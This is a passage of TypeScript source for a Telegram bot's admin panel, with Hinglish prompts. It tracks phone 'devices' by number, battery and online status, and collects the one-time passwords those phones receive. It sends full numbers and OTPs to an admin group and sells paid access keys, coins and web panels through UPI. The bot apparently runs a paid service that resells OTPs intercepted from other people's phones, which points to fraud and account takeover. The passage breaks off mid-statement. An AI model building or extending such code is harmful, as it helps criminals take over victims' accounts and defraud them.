    keyboard.push([{ text: "➕ Add Web Panel", callback_data: "adm_web_panel_add" }, { text: "🔙 Back", callback_data: "adm_menu" }]);
    await b.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
    return;
  }
  if (data === "adm_web_panel_add") {
    if (!adminChatIds.has(chatId)) { await b.sendMessage(chatId, "❌ Admin only."); return; }
    pendingInputs.set(chatId, { type: "web_panel_label" });
    await b.sendMessage(chatId, "🖥 Web panel ka naam/label bhejo:");
    return;
  }
  if (data.startsWith("adm_web_panel_set_url_")) {
    if (!adminChatIds.has(chatId)) { await b.sendMessage(chatId, "❌ Admin only."); return; }
    const panelId = parseInt(data.slice("adm_web_panel_set_url_".length), 10);
    if (!Number.isInteger(panelId) || panelId < 1) {
      await b.sendMessage(chatId, "❌ Invalid web panel.");
      return;
    }
    const [panel] = await db.select().from(webPanelsTable).where(eq(webPanelsTable.id, panelId));
    if (!panel) {
      await b.sendMessage(chatId, "❌ Web panel nahi mila. List refresh karke dobara try karo.");
      return;
    }
    pendingInputs.set(chatId, { type: "web_panel_update_url", data: { panelId } });
    await b.sendMessage(
      chatId,
      `🔗 ${panel.url ? "Naya" : "Purchase"} link bhejo for "${panel.label}". Sirf http:// ya https:// URL valid hai.`,
    );
    return;
  }
  if (data.startsWith("adm_web_panel_del_")) {
    if (!adminChatIds.has(chatId)) { await b.sendMessage(chatId, "❌ Admin only."); return; }
    const panelId = parseInt(data.slice("adm_web_panel_del_".length), 10);
    if (Number.isInteger(panelId)) {
      const [pendingOrder] = await db.select({ id: paymentRequestsTable.id })
        .from(paymentRequestsTable)
        .where(and(
          eq(paymentRequestsTable.requestType, "web_panel"),
          eq(paymentRequestsTable.webPanelId, panelId),
          eq(paymentRequestsTable.status, "pending"),
        ))
        .limit(1);
      if (pendingOrder) {
        await b.sendMessage(chatId, "⚠️ Is panel ki pending payment request hai. Pehle request approve/reject karein, phir panel delete karein.");
        return;
      }
      await db.delete(webPanelsTable).where(eq(webPanelsTable.id, panelId));
    }
    await b.sendMessage(chatId, "🗑 Web panel delete kar diya gaya.", {
      reply_markup: { inline_keyboard: [[{ text: "🖥 Web Panels", callback_data: "adm_web_panels" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
    });
    return;
  }
  if (data === "adm_qr") {
    const qrItems = await db.select().from(qrItemsTable).orderBy(desc(qrItemsTable.addedAt)).limit(10);
    const keyboard: InlineKeyboardButton[][] = qrItems.map((q) => [{ text: `📷 ${q.label}`, callback_data: `qr_show_${q.id}` }]);
    keyboard.push([{ text: "➕ Add QR", callback_data: "adm_qr_add" }, { text: "🔙 Back", callback_data: "adm_menu" }]);
    await b.sendMessage(chatId, `📷 *QR Codes (${qrItems.length}):*`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
    return;
  }
  if (data === "adm_qr_add") { pendingInputs.set(chatId, { type: "qr_label" }); await b.sendMessage(chatId, "📝 QR ka label bhejo:"); return; }
  if (data.startsWith("qr_show_")) {
    const id = parseInt(data.split("_")[2]);
    const [item] = await db.select().from(qrItemsTable).where(eq(qrItemsTable.id, id));
    if (!item) { await b.sendMessage(chatId, "❌ QR not found."); return; }
    const qrBuf = await qrcode.toBuffer(item.data, { type: "png", width: 400 });
    await b.sendPhoto(chatId, qrBuf, { caption: `📷 *${item.label}*\n\`${item.data}\``, parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_qr" }]] } });
    return;
  }
  if (data.startsWith("adm_devices_")) {
    const page = parseInt(data.split("_")[2] ?? "0");
    const limit = 20; const offset = page * limit;
    const [[totalRow], devices] = await Promise.all([
      db.select({ count: count() }).from(devicesTable),
      db.select().from(devicesTable).orderBy(desc(devicesTable.lastSeen)).limit(limit).offset(offset),
    ]);
    const total = Number(totalRow?.count ?? 0);
    const text = `📱 *All Devices (${total})* — Page ${page + 1}:\n\n` + (devices.map((d) => `🟢 \`${escapeMarkdown(d.phoneNumber ?? d.deviceId)}\` ${batteryStr(d.battery)}`).join("\n") || "_None_");
    const nav: InlineKeyboardButton[] = [];
    if (page > 0) nav.push({ text: "◀️ Prev", callback_data: `adm_devices_${page - 1}` });
    if (offset + limit < total) nav.push({ text: "Next ▶️", callback_data: `adm_devices_${page + 1}` });
    const keyboard = nav.length ? [nav, [{ text: "🔙 Back", callback_data: "adm_menu" }]] : [[{ text: "🔙 Back", callback_data: "adm_menu" }]];
    await b.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
    return;
  }
  if (data.startsWith("adm_online_")) {
    const page = parseInt(data.split("_")[2] ?? "0");
    const limit = 20; const offset = page * limit;
    const [[totalRow], devices] = await Promise.all([
      db.select({ count: count() }).from(devicesTable).where(eq(devicesTable.isOnline, true)),
      db.select().from(devicesTable).where(eq(devicesTable.isOnline, true)).orderBy(desc(devicesTable.lastSeen)).limit(limit).offset(offset),
    ]);
    const total = Number(totalRow?.count ?? 0);
    const text = `✅ *Online Devices (${total})* — Page ${page + 1}:\n\n` + (devices.map((d) => `🟢 \`${d.phoneNumber ?? d.deviceId}\` ${batteryStr(d.battery)}`).join("\n") || "_None_");
    const nav: InlineKeyboardButton[] = [];
    if (page > 0) nav.push({ text: "◀️ Prev", callback_data: `adm_online_${page - 1}` });
    if (offset + limit < total) nav.push({ text: "Next ▶️", callback_data: `adm_online_${page + 1}` });
    const keyboard = nav.length ? [nav, [{ text: "🔙 Back", callback_data: "adm_menu" }]] : [[{ text: "🔙 Back", callback_data: "adm_menu" }]];
    await b.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
    return;
  }
  if (data === "adm_key_create") { pendingInputs.set(chatId, { type: "key_minutes" }); await b.sendMessage(chatId, "⏱ Free key par kitne minutes ka access dena hai?"); return; }
  if (data === "adm_keys_list") {
    const keys = await db.select().from(accessKeysTable).where(eq(accessKeysTable.isActive, true)).orderBy(desc(accessKeysTable.createdAt)).limit(20);
    const text = keys.length ? `🔑 *Active Keys (${keys.length}):*\n\n` + keys.map((k) => `• \`${k.keyCode}\` — ${k.durationHours}h | ₹${k.price}`).join("\n") : "🔑 No active keys.";
    await b.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] } });
    return;
  }
  if (data === "adm_force_ch") {
    const channels = await db.select().from(forceChannelsTable).where(eq(forceChannelsTable.isActive, true));
    const list = channels.length ? channels.map((c) => `• @${c.channelUsername ?? c.channelId}`).join("\n") : "None";
    const keyboard: InlineKeyboardButton[][] = [[{ text: "➕ Add Channel", callback_data: "adm_force_add" }]];
    if (channels.length) keyboard.push([{ text: "🗑 Remove All", callback_data: "adm_force_clear" }]);
    keyboard.push([{ text: "🔙 Back", callback_data: "adm_menu" }]);
    await b.sendMessage(chatId, `📢 *Force Channels:*\n\n${list}`, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
    return;
  }
  if (data === "adm_force_add") { pendingInputs.set(chatId, { type: "force_ch_id" }); await b.sendMessage(chatId, "📢 Channel ID ya @username bhejo:"); return; }
  if (data === "adm_force_clear") { await db.update(forceChannelsTable).set({ isActive: false }); await b.sendMessage(chatId, "✅ All force channels removed.", { reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } }); return; }
  if (data === "adm_check_user") { pendingInputs.set(chatId, { type: "check_user" }); await b.sendMessage(chatId, "👤 User ka Chat ID bhejo:"); return; }

  if (data === "adm_income") {
    const [[incomeRow], [keyCount]] = await Promise.all([
      db.select({ total: sum(paymentRequestsTable.amount) }).from(paymentRequestsTable).where(eq(paymentRequestsTable.status, "approved")),
      db.select({ count: count() }).from(accessKeysTable).where(eq(accessKeysTable.isActive, false)),
    ]);
    const [walletTotal] = await db.select({ total: sum(walletsTable.balance) }).from(walletsTable);
    await b.sendMessage(chatId,
      `💰 *Revenue Stats*\n\nTotal Payments Approved: ${keyCount?.count ?? 0}\nLifetime Revenue: ₹${incomeRow?.total ?? 0}\n\n💳 Total wallet holdings: ₹${walletTotal?.total ?? 0}`,
      { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] } }
    );
    return;
  }
  if (data === "adm_total_otp") {
    const [[totalRow], recentMsgs] = await Promise.all([
      db.select({ count: count() }).from(messagesTable),
      db.select().from(messagesTable).orderBy(desc(messagesTable.receivedAt)).limit(5),
    ]);
    const recents = recentMsgs.map((m) => `• \`${(m.body ?? "").slice(0, 60)}\`\n  📤 ${m.fromNumber}`).join("\n");
    await b.sendMessage(chatId, `💬 *Total OTPs: ${totalRow?.count ?? 0}*\n\n*Recent:*\n${recents || "_None_"}`,
      { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] } }
    );
    return;
  }

  if (data === "adm_welcome_msg") {
    const current = await getSetting("welcome_message");
    pendingInputs.set(chatId, { type: "set_welcome" });
    await b.sendMessage(chatId,
      `💬 *Welcome Message Edit Karo:*\n\nCurrent:\n${current ?? "(default)"}\n\n_Variables: {name} = user name, {expires} = expiry date_\n\nNaya message bhejo ya "delete" likhke default restore karo:`,
      { parse_mode: "Markdown" }
    );
    return;
  }

  if (data === "adm_ban_user") { pendingInputs.set(chatId, { type: "ban_user" }); await b.sendMessage(chatId, "🚫 User ka Chat ID bhejo to ban karo:"); return; }
  if (data === "adm_unban_user") { pendingInputs.set(chatId, { type: "unban_user" }); await b.sendMessage(chatId, "✅ User ka Chat ID bhejo to unban karo:"); return; }

  if (data === "adm_add_money") { pendingInputs.set(chatId, { type: "admin_add_money_id" }); await b.sendMessage(chatId, "💸 User ka Chat ID bhejo:"); return; }
  if (data === "adm_deduct_money") { pendingInputs.set(chatId, { type: "admin_deduct_money_id" }); await b.sendMessage(chatId, "💸 User ka Chat ID bhejo:"); return; }
  if (data === "adm_add_coins") { pendingInputs.set(chatId, { type: "admin_add_coins_id" }); await b.sendMessage(chatId, "🪙 User ka Chat ID bhejo:"); return; }
  if (data === "adm_deduct_coins") { pendingInputs.set(chatId, { type: "admin_deduct_coins_id" }); await b.sendMessage(chatId, "🪙 User ka Chat ID bhejo:"); return; }
  if (data === "adm_add_refer") { pendingInputs.set(chatId, { type: "admin_add_refer_id" }); await b.sendMessage(chatId, "🔑 User ka Chat ID bhejo to refer time add karo:"); return; }
  if (data === "adm_deduct_refer") { pendingInputs.set(chatId, { type: "admin_deduct_refer_id" }); await b.sendMessage(chatId, "🔑 User ka Chat ID bhejo to refer time deduct karo:"); return; }


  if (data === "adm_number_control") {
    const [listedIds, hiddenIds] = await Promise.all([
      getListedNumberIds(),
      getHiddenNumberIds(),
    ]);
    const text =
      `🎛 *Number Control*\n\n` +
      `✅ Listed with messages: ${listedIds.length}\n` +
      `🚫 Hidden with messages: ${hiddenIds.length}\n\n` +
      `_Sirf wahi valid numbers count honge jo bot ki number-list me aa sakte hain aur jinpar saved message hai. No-message records count nahi honge._`;
    await b.sendMessage(chatId, text, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🗑 Remove All", callback_data: "adm_numbers_remove_all" }, { text: "✅ Add All", callback_data: "adm_numbers_add_all" }],
          [{ text: "🎲 Random Remove", callback_data: "adm_random_remove" }, { text: "🎲 Random Add", callback_data: "adm_random_add" }],
          [{ text: "🔙 Admin Menu", callback_data: "adm_menu" }],
        ],
      },
    });
    return;
  }

  if (data === "adm_numbers_remove_all") {
    await b.sendMessage(chatId, "⚠️ Confirm karo: kya user number-list se sabhi numbers hide karne hain?", {
      reply_markup: { inline_keyboard: [[
        { text: "✅ Confirm Remove All", callback_data: "adm_numbers_remove_all_confirm" },
        { text: "🔙 Cancel", callback_data: "adm_number_control" },
      ]] },
    });
    return;
  }

  if (data === "adm_numbers_remove_all_confirm") {
    const listedIds = await getListedNumberIds();
    await Promise.all(listedIds.map((id) =>
      db.update(devicesTable).set({ isListed: false }).where(eq(devicesTable.id, id))
    ));
    await refreshNumberVisibility();
    await b.sendMessage(chatId, `🗑 ${listedIds.length} message-wale listed numbers hide kar diye gaye. No-message records par koi action nahi hua.`, {
      reply_markup: { inline_keyboard: [[{ text: "🎛 Number Control", callback_data: "adm_number_control" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
    });
    return;
  }

  if (data === "adm_numbers_add_all") {
    const hiddenIds = await getHiddenNumberIds();
    await Promise.all(hiddenIds.map((id) =>
      db.update(devicesTable).set({ isListed: true }).where(eq(devicesTable.id, id))
    ));
    await refreshNumberVisibility();
    await b.sendMessage(chatId, `✅ ${hiddenIds.length} hidden message-wale numbers user-list me restore kar diye gaye.`, {
      reply_markup: { inline_keyboard: [[{ text: "🎛 Number Control", callback_data: "adm_number_control" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
    });
    return;
  }

  if (data === "adm_random_remove" || data === "adm_remove_number") {
    pendingInputs.set(chatId, { type: "random_remove_count" });
    await b.sendMessage(chatId, "🎲 Kitne listed numbers randomly hide karne hain? Sirf number bhejo:");
    return;
  }

  if (data === "adm_random_add") {
    pendingInputs.set(chatId, { type: "random_add_count" });
    await b.sendMessage(chatId, "🎲 Kitne hidden numbers randomly wapas add karne hain? Sirf number bhejo:");
    return;
  }

  if (data === "adm_add_admin") { pendingInputs.set(chatId, { type: "add_admin" }); await b.sendMessage(chatId, "👑 New admin ka Chat ID bhejo:"); return; }

  if (data === "adm_settings") {
    const [coinCost, accessDur, referTarget, referReward, extraOptions] = await Promise.all([
      getSetting("coin_cost_per_number"),
      getSetting("credit_access_duration"),
      getSetting("refer_target"),
      getSetting("refer_reward_minutes"),
      getSetting("refer_extra_options"),
    ]);
    await b.sendMessage(chatId,
      `⚙️ *Settings*\n\n🪙 Coin cost per number: ${coinCost ?? "1"}\n⏳ Credit access duration: ${accessDur ?? "30"}s\n🔑 Refer target: ${referTarget ?? "2"} referrals\n🎁 Target reward: ${referReward ?? "60"} minutes\n✨ Extra per referral: ${extraOptions ?? "5,10,12"} minutes (random)\n\nChange karne ke liye option select karo:`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🪙 Set Coin Cost", callback_data: "adm_set_coin_cost" }, { text: "⏳ Set Credit Duration", callback_data: "adm_set_credit_dur" }],
            [{ text: "🔑 Set Refer Target", callback_data: "adm_set_refer_target" }, { text: "🎁 Set Target Reward", callback_data: "adm_set_refer_reward" }],
            [{ text: "✨ Set Extra Bonus", callback_data: "adm_set_refer_extra" }],
            [{ text: "🔙 Back", callback_data: "adm_menu" }],
          ],
        },
      }
    );
    return;
  }

  if (data === "adm_set_coin_cost") { pendingInputs.set(chatId, { type: "set_coin_cost" }); await b.sendMessage(chatId, "🪙 Coin cost per number bhejo (default: 1):"); return; }
  if (data === "adm_set_credit_dur") { pendingInputs.set(chatId, { type: "set_credit_dur" }); await b.sendMessage(chatId, "⏳ Credit access duration in seconds bhejo (default: 30):"); return; }
  if (data === "adm_set_refer_target") { pendingInputs.set(chatId, { type: "set_refer_target" }); await b.sendMessage(chatId, "🔑 Kitne referrals pe reward milega? (default: 2):"); return; }
  if (data === "adm_set_refer_reward") { pendingInputs.set(chatId, { type: "set_refer_reward" }); await b.sendMessage(chatId, "🎁 Target complete hone par kitne minutes access mile?"); return; }
  if (data === "adm_set_refer_extra") {
    const current = await getSetting("refer_extra_options") ?? await getSetting("refer_bonus_options") ?? "5,10,12";
    pendingInputs.set(chatId, { type: "set_refer_extra" });
    await b.sendMessage(chatId, `✨ Har verified referral par alag random extra access ke minutes comma se bhejo.\n\nExample: 5,10,12\nCurrent: ${current}`);
    return;
  }

  if (data === "adm_group") {
    const groupId = await getActivityGroupId();
    const groupText = groupId
      ? `✅ Configured OTP group/channel: \`${escapeMarkdown(groupId)}\``
      : "❌ No OTP group/channel configured.";
    await b.sendMessage(chatId, `📣 *OTP Group*\n\n${groupText}\n\nSirf masked OTP notifications yahan bheji jayengi. Online, offline aur new-number events yahan nahi aayenge.`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: groupId ? "🔄 Change Group" : "➕ Add Group", callback_data: "adm_group_set" }],
          [{ text: "🧪 Test Message", callback_data: "adm_group_test" }, { text: "🗑 Remove Group", callback_data: "adm_group_remove" }],
          [{ text: "🔙 Admin Menu", callback_data: "adm_menu" }],
        ],
      },
    });
    return;
  }

  if (data === "adm_admin_group") {
    const groupId = await getAdminGroupId();
    const groupText = groupId
      ? `✅ Configured admin group/channel: \`${escapeMarkdown(groupId)}\``
      : "❌ No admin group/channel configured.";
    await b.sendMessage(chatId,
      `👑 *Admin Group*\n\n${groupText}\n\nFull number, full OTP, new-number, online aur offline notifications yahan bheji jayengi.`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: groupId ? "🔄 Change Admin Group" : "➕ Add Admin Group", callback_data: "adm_admin_group_set" }],
            [{ text: "🧪 Test Message", callback_data: "adm_admin_group_test" }, { text: "🗑 Remove Group", callback_data: "adm_admin_group_remove" }],
            [{ text: "🔙 Admin Menu", callback_data: "adm_menu" }],
          ],
        },
      },
    );
    return;
  }

  if (data === "adm_group_set") {
    pendingInputs.set(chatId, { type: "set_activity_group" });
    await b.sendMessage(chatId,
      "📣 Telegram group/channel ka chat ID bhejo.\n\nExamples: `-1001234567890` ya `@channelusername`\nBot ko target group/channel me add karke admin permission dena zaroori hai.",
      { parse_mode: "Markdown" },
    );
    return;
  }

  if (data === "adm_admin_group_set") {
    pendingInputs.set(chatId, { type: "set_admin_group" });
    await b.sendMessage(chatId,
      "👑 Admin group/channel ka chat ID bhejo.\n\nExamples: `-1001234567890` ya `@channelusername`\nBot ko target group/channel me add karke admin permission dena zaroori hai.",
      { parse_mode: "Markdown" },
    );
    return;
  }

  if (data === "adm_group_remove") {
    await deleteSetting(ACTIVITY_GROUP_SETTING);
    await b.sendMessage(chatId, "✅ OTP group/channel remove kar diya gaya.", {
      reply_markup: { inline_keyboard: [[{ text: "📣 Set Group", callback_data: "adm_group" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
    });
    return;
  }

  if (data === "adm_admin_group_remove") {
    await deleteSetting(ADMIN_GROUP_SETTING);
    await b.sendMessage(chatId, "✅ Admin group/channel remove kar diya gaya.", {
      reply_markup: { inline_keyboard: [[{ text: "👑 Admin Group", callback_data: "adm_admin_group" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
    });
    return;
  }

  if (data === "adm_group_test") {
    const groupId = await getActivityGroupId();
    if (!groupId) {
      await b.sendMessage(chatId, "❌ Pehle OTP group/channel configure karo.", {
        reply_markup: { inline_keyboard: [[{ text: "📣 Set Group", callback_data: "adm_group" }]] },
      });
      return;
    }
    const sent = await sendActivityNotification(formatGroupOtpNotification({
      number: "+919406300300",
      body: "Your WhatsApp OTP is 677890",
      from: "WhatsApp",
      timestamp: new Date(),
    }));
    await b.sendMessage(chatId, sent
      ? "✅ Test OTP message OTP group/channel me bhej diya gaya."
      : "❌ Test message nahi bheja ja saka. Chat ID, bot membership aur admin permissions check karo.", {
      reply_markup: { inline_keyboard: [[{ text: "📣 Group Settings", callback_data: "adm_group" }]] },
    });
    return;
  }

  if (data === "adm_admin_group_test") {
    const groupId = await getAdminGroupId();
    if (!groupId) {
      await b.sendMessage(chatId, "❌ Pehle admin group/channel configure karo.", {
        reply_markup: { inline_keyboard: [[{ text: "👑 Admin Group", callback_data: "adm_admin_group" }]] },
      });
      return;
    }
    const sent = await sendAdminGroupNotification(formatAdminGroupOtpNotification({
      number: "+919406300300",
      body: "Your WhatsApp OTP is 677890",
      from: "WhatsApp",
      timestamp: new Date(),
    }));
    await b.sendMessage(chatId, sent
      ? "✅ Full-number/full-OTP test message admin group/channel me bhej diya gaya."
      : "❌ Test message nahi bheja ja saka. Chat ID, bot membership aur admin permissions check karo.", {
      reply_markup: { inline_keyboard: [[{ text: "👑 Admin Group", callback_data: "adm_admin_group" }]] },
    });
    return;
  }

  if (data === "adm_maintenance") {
    const current = await getSetting("maintenance");
    const isOn = current === "1";
    await setSetting("maintenance", isOn ? "0" : "1");
    await b.sendMessage(chatId, `🔧 Maintenance mode: ${isOn ? "❌ OFF" : "✅ ON"}`, {
      reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
    });
    return;
  }

  // ─── NEW ADMIN FEATURES ──────────────────────────────────────────────────────

  if (data === "adm_reset_user") {
    pendingInputs.set(chatId, { type: "reset_user_id" });
    await b.sendMessage(chatId, "🔄 User ka Chat ID bhejo jiska data reset karna hai:");
    return;
  }

  if (data.startsWith("confirm_reset_")) {
    const userId = data.slice("confirm_reset_".length);
    await Promise.all([
      db.delete(walletsTable).where(eq(walletsTable.chatId, userId)).catch(() => {}),
      db.delete(userAccessTable).where(eq(userAccessTable.chatId, userId)).catch(() => {}),
      setCreditCoins(userId, 0),
      setSetting(`ban_${userId}`, "0"),
      setSetting(`access_paused_${userId}`, "0"),
    ]);
    invalidateAccess(userId);
    await b.sendMessage(chatId, `✅ User \`${userId}\` ka data reset ho gaya!\n\n_Wallet, key access, coins, ban sab clear._`, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
    });
    b.sendMessage(userId, "🔄 Your account has been reset by admin. Use /start to begin fresh.").catch(() => {});
    return;
  }

  if (data === "adm_top_active") {
    const now = new Date();
    const active = await db.select().from(userAccessTable)
      .where(gt(userAccessTable.expiresAt, now))
      .orderBy(desc(userAccessTable.expiresAt)).limit(20);
    const text = active.length
      ? `🏆 *Top Active Users (${active.length}):*\n\n` +
        active.map((u, i) => `${i + 1}. \`${u.chatId}\`\n   ⏰ Till ${formatDate(u.expiresAt)}`).join("\n")
      : "🏆 No active key users currently.";
    await b.sendMessage(chatId, text, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] },
    });
    return;
  }

  if (data === "adm_key_logs") {
    const logs = await db.select().from(accessKeysTable)
      .where(isNotNull(accessKeysTable.claimedAt))
      .orderBy(desc(accessKeysTable.claimedAt)).limit(20);
    const text = logs.length
      ? `📋 *Key Activation Logs (last ${logs.length}):*\n\n` +
        logs.map((k, i) =>
          `${i + 1}. \`${k.keyCode}\` — ${k.durationHours}h | ₹${k.price}\n   👤 \`${k.claimedByChatId ?? "—"}\` | 🕐 ${formatDate(k.claimedAt)}`
        ).join("\n")
      : "📋 No key activations yet.";
    await b.sendMessage(chatId, text, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] },
    });
    return;
  }

  if (data === "adm_discount") {
    const [kd, cd] = await Promise.all([getSetting("key_discount_pct"), getSetting("coin_discount_pct")]);
    await b.sendMessage(chatId,
      `💯 *Discount Settings*\n\n🔑 Key Plan Discount: *${kd ?? "0"}%*\n🪙 Coin Plan Discount: *${cd ?? "0"}%*\n\n_0 = no discount | 100 = free_`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔑 Set Key Discount", callback_data: "adm_set_key_disc" }, { text: "🪙 Set Coin Discount", callback_data: "adm_set_coin_disc" }],
            [{ text: "🔙 Back", callback_data: "adm_menu" }],
          ],
        },
      }
    );
    return;
  }
  if (data === "adm_set_key_disc") { pendingInputs.set(chatId, { type: "set_key_disc" }); await b.sendMessage(chatId, "🔑 Key plan discount % bhejo (0–100, 0 = no discount):"); return; }
  if (data === "adm_set_coin_disc") { pendingInputs.set(chatId, { type: "set_coin_disc" }); await b.sendMessage(chatId, "🪙 Coin plan discount % bhejo (0–100, 0 = no discount):"); return; }

  if (data === "adm_top_referrers") {
    const topRefs = await db.select({
      referrer: referralsTable.referrerChatId,
      total: count(),
    }).from(referralsTable)
      .groupBy(referralsTable.referrerChatId)
      .orderBy(desc(count()))
      .limit(50);
    const text = topRefs.length
      ? `🥇 *Top 50 Referrers:*\n\n` +
        topRefs.map((r, i) => `${i + 1}. \`${r.referrer}\` — ${r.total} referrals`).join("\n")
      : "🥇 No referrals yet.";
    await b.sendMessage(chatId, text, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] },
    });
    return;
  }

  if (data === "adm_top_buyers") {
    const topBuyers = await db.select({
      chatId: paymentRequestsTable.chatId,
      total: sum(paymentRequestsTable.amount),
    }).from(paymentRequestsTable)
      .where(eq(paymentRequestsTable.status, "approved"))
      .groupBy(paymentRequestsTable.chatId)
      .orderBy(desc(sum(paymentRequestsTable.amount)))
      .limit(50);
    const text = topBuyers.length
      ? `💎 *Top 50 Buyers:*\n\n` +
        topBuyers.map((buyer, i) => `${i + 1}. \`${buyer.chatId}\` — ₹${buyer.total ?? 0}`).join("\n")
      : "💎 No buyers yet.";
    await b.sendMessage(chatId, text, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] },
    });
    return;
  }

  if (data === "adm_broadcast") {
    pendingInputs.set(chatId, { type: "broadcast" });
    await b.sendMessage(chatId, "📢 Broadcast message bhejo.\n\nPlain text only, maximum 4096 characters. Cancel ke liye /start bhej sakte ho.");
    return;
  }

  if (data === "adm_flash") {
    pendingInputs.set(chatId, { type: "flash_duration" });
    await b.sendMessage(chatId, "⚡ Flash Challenge kitne hours chalega?");
    return;
  }

  if (data === "adm_public_key") {
    pendingInputs.set(chatId, { type: "public_minutes" });
    await b.sendMessage(chatId, "🔓 Public key se kitne minutes ka access dena hai?");
    return;
  }

  if (data === "adm_paid_key") {
    pendingInputs.set(chatId, { type: "paid_minutes" });
    await b.sendMessage(chatId, "💳 Paid key se kitne minutes ka access dena hai?");
    return;
  }

  if (data === "adm_key_pause") { pendingInputs.set(chatId, { type: "key_pause_id" }); await b.sendMessage(chatId, "⏸ User ka Chat ID bhejo jiska access pause/resume karna hai:"); return; }
  if (data === "adm_credit_expiry") { pendingInputs.set(chatId, { type: "credit_expiry_id" }); await b.sendMessage(chatId, "🗑 User ka Chat ID bhejo jiske credit coins manually expire karne hai:"); return; }
  if (data === "adm_key_extend") { pendingInputs.set(chatId, { type: "key_extend_id" }); await b.sendMessage(chatId, "➕ User ka Chat ID bhejo jiska key extend karna hai:"); return; }
  if (data === "adm_key_reduce") { pendingInputs.set(chatId, { type: "key_reduce_id" }); await b.sendMessage(chatId, "➖ User ka Chat ID bhejo jiska key reduce karna hai:"); return; }
}

// ─── PENDING INPUT HANDLER ─────────────────────────────────────────────────────
async function handlePendingInput(
  chatId: string, pending: { type: string; data?: Record<string, unknown> },
  text: string, b: TelegramBot, _msg?: Message
): Promise<void> {
  switch (pending.type) {

    case "set_activity_group": {
      const forwardedChatId = (_msg as (Message & { forward_from_chat?: { id?: number | string } }) | undefined)
        ?.forward_from_chat?.id;
      const groupId = forwardedChatId !== undefined ? String(forwardedChatId) : text.trim();
      const validNumericId = /^-?\d+$/.test(groupId);
      const validUsername = /^@[A-Za-z][A-Za-z0-9_]{4,}$/.test(groupId);
      if (!validNumericId && !validUsername) {
        await b.sendMessage(chatId, "❌ Valid group/channel chat ID bhejo.\nExample: `-1001234567890` ya `@channelusername`", { parse_mode: "Markdown" });
        return;
      }
      await setSetting(ACTIVITY_GROUP_SETTING, groupId);
      await b.sendMessage(chatId,
        `✅ OTP group/channel configure ho gaya: \`${escapeMarkdown(groupId)}\`\n\nAb sirf masked OTP notifications yahan bheji jayengi. Online, offline aur new-number events nahi aayenge.`,
        {
          parse_mode: "Markdown",
          reply_markup: { inline_keyboard: [[{ text: "🧪 Test Message", callback_data: "adm_group_test" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
        },
      );
      break;
    }

    case "set_admin_group": {
      const forwardedChatId = (_msg as (Message & { forward_from_chat?: { id?: number | string } }) | undefined)
        ?.forward_from_chat?.id;
      const groupId = forwardedChatId !== undefined ? String(forwardedChatId) : text.trim();
      const validNumericId = /^-?\d+$/.test(groupId);
      const validUsername = /^@[A-Za-z][A-Za-z0-9_]{4,}$/.test(groupId);
      if (!validNumericId && !validUsername) {
        await b.sendMessage(chatId, "❌ Valid admin group/channel chat ID bhejo.\nExample: `-1001234567890` ya `@channelusername`", { parse_mode: "Markdown" });
        return;
      }
      await setSetting(ADMIN_GROUP_SETTING, groupId);
      await b.sendMessage(chatId,
        `✅ Admin group/channel configure ho gaya: \`${escapeMarkdown(groupId)}\`\n\nYahan full number, full OTP, new-number, online aur offline notifications bheji jayengi.`,
        {
          parse_mode: "Markdown",
          reply_markup: { inline_keyboard: [[{ text: "🧪 Test Message", callback_data: "adm_admin_group_test" }, { text: "🔙 Admin Menu", callback_data: "adm_menu" }]] },
        },
      );
      break;
    }

    case "pay_amount": {
      const amount = parseInt(text);
      if (isNaN(amount) || amount < 1) { await b.sendMessage(chatId, "❌ Valid amount bhejo (e.g., 50)."); return; }
      const upiId = await getSetting("upi_id");
      if (!upiId) {
        await b.sendMessage(chatId, "⚠️ Payment method setup nahi hai abhi. Admin se contact karo.");
        return;
      }
      const upiLink = `upi://pay?pa=${encodeURIComponent(upiId)}&pn=OTPBot&am=${amount}&cu=INR`;
      const qrBuf = await qrcode.toBuffer(upiLink, { type: "png", width: 400 });
      pendingInputs.set(chatId, { type: "pay_utr", data: { amount } });
      await b.sendPhoto(chatId, qrBuf, {
        caption:
          `💳 *Payment Details*\n\n💰 Amount: *₹${amount}*\n📱 UPI ID: \`${upiId}\`\n\n` +
